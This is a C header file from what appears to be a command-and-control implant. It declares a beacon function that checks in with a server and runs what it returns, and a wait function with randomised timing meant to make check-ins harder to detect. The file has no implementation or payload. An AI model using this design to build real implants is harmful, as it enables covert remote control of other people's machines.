#ifndef C2_IMPLANT_BEACON_H
#define C2_IMPLANT_BEACON_H

#include "config.h"

/* Check in once and act on whatever comes back. Returns 1 when the server asked
   this implant to exit, 0 to keep beaconing. */
int beacon_once(const struct target_config *target);

/* Sleep a randomised interval so check-ins do not land on an even beat. */
void beacon_wait(void);

#endif
